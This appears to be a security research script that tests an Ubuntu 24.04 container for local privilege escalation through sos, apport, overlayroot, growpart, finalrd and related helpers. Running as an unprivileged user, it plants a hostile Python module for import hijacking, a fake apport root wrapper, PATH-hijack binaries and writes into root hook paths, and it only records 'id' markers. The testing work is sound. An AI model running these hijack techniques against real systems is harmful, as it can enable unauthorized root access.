#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'TARGET'
set +e
export LC_ALL=C

probe="support_overlay_helpers"
base="/tmp/${probe}"
ahome="/home/attacker/${probe}"
root_marker="/root/${probe}.root_marker"

section() {
  printf '\n## %s\n' "$1"
}

run_attacker() {
  label="$1"
  shift
  printf '\n### attacker: %s\n' "$label"
  runuser -u attacker -- timeout 15s bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

cleanup_probe() {
  rm -rf "${base}" "${base}".* "${ahome}" /tmp/support_overlay_helpers* \
    /home/attacker/support_overlay_helpers* /var/crash/support_overlay_helpers* \
    /run/finalrd/support_overlay_helpers* 2>/dev/null || true
  rm -f "${root_marker}" /root/support_overlay_helpers* 2>/dev/null || true
}

cleanup_probe

section "target and attacker"
sed -n '1,8p' /etc/os-release
uname -a
ps -p 1 -o user=,comm=,args=
id attacker
systemctl is-system-running 2>&1 || true

section "default package proof"
for pkg in ubuntu-minimal ubuntu-server ubuntu-standard sosreport sos apport \
  apport-core-dump-handler python3-apport overlayroot cloud-init \
  cloud-initramfs-copymods cloud-initramfs-dyn-netconf cloud-initramfs-tools \
  cloud-guest-utils growpart finalrd friendly-recovery unminimize policykit-1 \
  pkexec polkitd; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>/dev/null ||
    printf '%s\t(not installed)\tun\n' "$pkg"
done | sort

section "command ownership and privilege bits"
for f in /usr/bin/sosreport /usr/bin/sos /usr/bin/apport-cli /usr/bin/ubuntu-bug \
  /usr/bin/apport-bug /usr/share/apport/root_info_wrapper /usr/share/apport/apport \
  /usr/sbin/overlayroot-chroot /usr/bin/growpart /usr/bin/finalrd \
  /usr/sbin/update-initramfs /usr/sbin/mkinitramfs /usr/bin/unminimize \
  /lib/recovery-mode/recovery-menu /usr/lib/systemd/system-generators/friendly-recovery; do
  if [ -e "$f" ] || [ -L "$f" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$f"
    getcap "$f" 2>/dev/null || true
  else
    echo "MISSING $f"
  fi
done

section "unit reachability"
systemctl list-unit-files --no-pager --no-legend '*apport*' '*sos*' '*overlay*' \
  '*cloud*' '*growpart*' '*finalrd*' '*recovery*' '*minimize*' 2>&1 | sort
for u in apport.service apport-forward.socket apport-autoreport.path \
  apport-autoreport.timer apport-autoreport.service finalrd.service \
  friendly-recovery.service friendly-recovery.target cloud-init-local.service \
  cloud-init.service cloud-config.service cloud-final.service; do
  echo "### $u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState \
    -p Result -p ConditionResult -p FragmentPath -p User -p ExecStart \
    -p ExecStop "$u" 2>&1 || true
done

section "hook config and state path modes"
for p in /etc/sos /etc/sos/extras.d /etc/sos/presets.d /etc/sos/groups.d \
  /usr/lib/python3/dist-packages/sos /usr/share/apport \
  /usr/share/apport/package-hooks /usr/share/apport/general-hooks /etc/apport \
  /var/crash /run/apport.socket /etc/overlayroot.conf \
  /etc/overlayroot.local.conf /etc/update-motd.d/97-overlayroot \
  /usr/share/initramfs-tools/hooks/overlayroot \
  /usr/share/initramfs-tools/scripts/init-bottom/overlayroot \
  /usr/share/initramfs-tools/hooks/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-premount/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/scripts/init-bottom/cloud-initramfs-dyn-netconf \
  /usr/share/initramfs-tools/hooks/copymods \
  /usr/share/initramfs-tools/scripts/init-bottom/copymods /etc/initramfs-tools \
  /etc/initramfs-tools/hooks /etc/initramfs-tools/conf.d /etc/cloud \
  /var/lib/cloud /run/cloud-init /run/network /usr/share/finalrd /etc/finalrd \
  /run/finalrd /usr/lib/finalrd /lib/recovery-mode/options \
  /run/friendly_recovery.resume /var/lib/dpkg/info/overlayroot.postinst \
  /var/lib/dpkg/info/cloud-initramfs-copymods.postinst \
  /var/lib/dpkg/info/cloud-initramfs-dyn-netconf.postinst; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %F %n' "$p"
  else
    echo "MISSING $p"
  fi
done

section "attacker write attempts to root hook/state paths"
run_attacker "write root-owned support/overlay paths" '
for p in \
  /etc/sos/extras.d/support_overlay_helpers \
  /etc/sos/presets.d/support_overlay_helpers \
  /usr/share/apport/package-hooks/support_overlay_helpers.py \
  /usr/share/apport/general-hooks/support_overlay_helpers.py \
  /etc/apport/support_overlay_helpers \
  /var/crash/support_overlay_helpers.crash \
  /etc/overlayroot.local.conf \
  /etc/overlayroot.conf \
  /etc/update-motd.d/97-overlayroot \
  /usr/share/initramfs-tools/hooks/support_overlay_helpers \
  /usr/share/initramfs-tools/scripts/init-bottom/support_overlay_helpers \
  /etc/initramfs-tools/hooks/support_overlay_helpers \
  /etc/initramfs-tools/conf.d/support_overlay_helpers \
  /run/network/support_overlay_helpers \
  /usr/share/finalrd/support_overlay_helpers.finalrd \
  /etc/finalrd/support_overlay_helpers.finalrd \
  /run/finalrd/support_overlay_helpers.finalrd \
  /lib/recovery-mode/options/support_overlay_helpers \
  /run/friendly_recovery.resume \
  /var/lib/dpkg/info/overlayroot.postinst.support_overlay_helpers; do
  printf "touch %s -> " "$p"
  if touch "$p" 2>/tmp/support_overlay_helpers.touch.err; then
    rm -f "$p"
    echo OK
  else
    cat /tmp/support_overlay_helpers.touch.err
  fi
done
rm -f /tmp/support_overlay_helpers.touch.err
'

section "sosreport/sos uid1001 boundary"
run_attacker "sos cwd import remains caller uid" '
rm -rf "$HOME/support_overlay_helpers"
mkdir -p "$HOME/support_overlay_helpers/sos"
cat > "$HOME/support_overlay_helpers/sos/__init__.py" <<EOF
import os
print("SOS_IMPORT_EUID=%s" % os.geteuid())
os.system("id > /tmp/support_overlay_helpers.sos_import_id")
raise SystemExit(77)
EOF
cd "$HOME/support_overlay_helpers"
/usr/bin/sos report --help >/tmp/support_overlay_helpers.sos.out 2>/tmp/support_overlay_helpers.sos.err
echo "sos_rc=$?"
cat /tmp/support_overlay_helpers.sos.out /tmp/support_overlay_helpers.sos.err
cat /tmp/support_overlay_helpers.sos_import_id 2>/dev/null || echo no_sos_import_marker
'
run_attacker "sos report root-required check" '
/usr/bin/sos report --batch --dry-run --tmp-dir /tmp/support_overlay_helpers.sos_tmp --quiet \
  >/tmp/support_overlay_helpers.sos_report.out 2>/tmp/support_overlay_helpers.sos_report.err
echo "sos_report_rc=$?"
sed -n "1,80p" /tmp/support_overlay_helpers.sos_report.out
sed -n "1,80p" /tmp/support_overlay_helpers.sos_report.err
'

section "apport/ubuntu-bug uid1001 boundary"
run_attacker "apport root_info_wrapper prefix remains caller uid" '
mkdir -p /tmp/support_overlay_helpers.apport_data
cat > /tmp/support_overlay_helpers.apport_data/root_info_wrapper <<'"'"'EOF'"'"'
#!/bin/sh
id > /tmp/support_overlay_helpers.apport_wrapper_id
exec sh "$@"
EOF
chmod 755 /tmp/support_overlay_helpers.apport_data/root_info_wrapper
APPORT_DATA_DIR=/tmp/support_overlay_helpers.apport_data python3 - <<PY
import os
import apport
from apport.hookutils import attach_root_command_outputs
r = apport.Report()
attach_root_command_outputs(r, {"Probe": "id"})
print("caller_euid", os.geteuid())
print("probe", r.get("Probe", "missing").strip())
PY
cat /tmp/support_overlay_helpers.apport_wrapper_id 2>/dev/null || echo no_apport_wrapper_marker
'
run_attacker "apport forward socket is not reachable" '
python3 - <<PY
import os, socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
try:
    s.connect("/run/apport.socket")
    print("CONNECT_OK", os.geteuid())
except Exception as e:
    print("CONNECT_FAIL", type(e).__name__, e, "euid", os.geteuid())
PY
'
run_attacker "apport-cli report output stays attacker-owned" '
/usr/bin/apport-cli -f -p command-not-found --save /tmp/support_overlay_helpers.apport \
  >/tmp/support_overlay_helpers.apport_cli.out 2>/tmp/support_overlay_helpers.apport_cli.err
echo "apport_cli_rc=$?"
ls -l /tmp/support_overlay_helpers.apport 2>/dev/null || true
sed -n "1,80p" /tmp/support_overlay_helpers.apport_cli.err
'

section "overlayroot and motd helper uid1001 boundary"
run_attacker "overlayroot-chroot hostile PATH remains caller uid" '
mkdir -p "$HOME/support_overlay_helpers/bin"
cat > "$HOME/support_overlay_helpers/bin/awk" <<EOF
#!/bin/sh
id > /tmp/support_overlay_helpers.overlayroot_path_id
exit 1
EOF
chmod 755 "$HOME/support_overlay_helpers/bin/awk"
PATH="$HOME/support_overlay_helpers/bin:$PATH" /usr/sbin/overlayroot-chroot /bin/true \
  >/tmp/support_overlay_helpers.overlayroot.out 2>/tmp/support_overlay_helpers.overlayroot.err
echo "overlayroot_chroot_rc=$?"
cat /tmp/support_overlay_helpers.overlayroot.err
cat /tmp/support_overlay_helpers.overlayroot_path_id 2>/dev/null || echo no_overlayroot_path_marker
'
run_attacker "97-overlayroot motd hostile PATH remains caller uid" '
mkdir -p "$HOME/support_overlay_helpers/bin"
cat > "$HOME/support_overlay_helpers/bin/egrep" <<EOF
#!/bin/sh
id > /tmp/support_overlay_helpers.overlayroot_motd_id
exit 0
EOF
chmod 755 "$HOME/support_overlay_helpers/bin/egrep"
PATH="$HOME/support_overlay_helpers/bin:$PATH" /etc/update-motd.d/97-overlayroot \
  >/tmp/support_overlay_helpers.overlayroot_motd.out 2>/tmp/support_overlay_helpers.overlayroot_motd.err
echo "overlayroot_motd_rc=$?"
cat /tmp/support_overlay_helpers.overlayroot_motd_id 2>/dev/null || echo no_overlayroot_motd_marker
'

section "cloud-initramfs and growpart uid1001 boundary"
run_attacker "growpart hostile PATH remains caller uid" '
mkdir -p "$HOME/support_overlay_helpers/bin"
cat > "$HOME/support_overlay_helpers/bin/sfdisk" <<EOF
#!/bin/sh
id > /tmp/support_overlay_helpers.growpart_path_id
exit 1
EOF
chmod 755 "$HOME/support_overlay_helpers/bin/sfdisk"
truncate -s 10M /tmp/support_overlay_helpers.disk
PATH="$HOME/support_overlay_helpers/bin:$PATH" /usr/bin/growpart -N /tmp/support_overlay_helpers.disk 1 \
  >/tmp/support_overlay_helpers.growpart.out 2>/tmp/support_overlay_helpers.growpart.err
echo "growpart_rc=$?"
sed -n "1,80p" /tmp/support_overlay_helpers.growpart.out
sed -n "1,80p" /tmp/support_overlay_helpers.growpart.err
cat /tmp/support_overlay_helpers.growpart_path_id 2>/dev/null || echo no_growpart_path_marker
'
run_attacker "cloud-initramfs live service triggers absent" '
for u in cloud-init-local.service cloud-init.service cloud-config.service cloud-final.service; do
  echo "### $u"
  systemctl start "$u" 2>&1 || true
done
'

section "finalrd/recovery/unminimize uid1001 boundary"
run_attacker "attacker cannot alter system manager environment or finalrd/recovery units" '
systemctl set-environment PATH=/home/attacker/support_overlay_helpers/bin:/usr/bin:/bin 2>&1 || true
systemctl stop finalrd.service 2>&1 || true
systemctl start friendly-recovery.service 2>&1 || true
'
run_attacker "finalrd direct hostile PATH remains caller uid" '
mkdir -p "$HOME/support_overlay_helpers/bin"
cat > "$HOME/support_overlay_helpers/bin/mount" <<EOF
#!/bin/sh
id > /tmp/support_overlay_helpers.finalrd_path_id
exit 1
EOF
chmod 755 "$HOME/support_overlay_helpers/bin/mount"
PATH="$HOME/support_overlay_helpers/bin:$PATH" /usr/bin/finalrd \
  >/tmp/support_overlay_helpers.finalrd.out 2>/tmp/support_overlay_helpers.finalrd.err
echo "finalrd_rc=$?"
sed -n "1,80p" /tmp/support_overlay_helpers.finalrd.err
cat /tmp/support_overlay_helpers.finalrd_path_id 2>/dev/null || echo no_finalrd_path_marker
'
run_attacker "unminimize direct run is caller uid and aborts before package changes" '
printf "n\n" | /usr/bin/unminimize >/tmp/support_overlay_helpers.unminimize.out 2>/tmp/support_overlay_helpers.unminimize.err
echo "unminimize_rc=$?"
sed -n "1,80p" /tmp/support_overlay_helpers.unminimize.out
sed -n "1,80p" /tmp/support_overlay_helpers.unminimize.err
'

section "root proof sweep before cleanup"
if [ -e "$root_marker" ]; then
  echo "ROOT_PROOF_PRESENT"
  ls -l "$root_marker"
else
  echo "ROOT_PROOF_ABSENT"
fi
find /tmp /home/attacker /var/crash -maxdepth 2 -name 'support_overlay_helpers*' \
  -printf '%M %u:%g %p\n' 2>/dev/null | sort

section "cleanup"
cleanup_probe
find /tmp /home/attacker /var/crash /root -maxdepth 2 -name 'support_overlay_helpers*' \
  -printf '%M %u:%g %p\n' 2>/dev/null | sort
if [ ! -e "$root_marker" ]; then
  echo "root_marker_absent_after_cleanup=yes"
fi

section "systemd health"
systemctl is-system-running 2>&1 || true
systemctl --failed --no-pager 2>&1 || true
TARGET
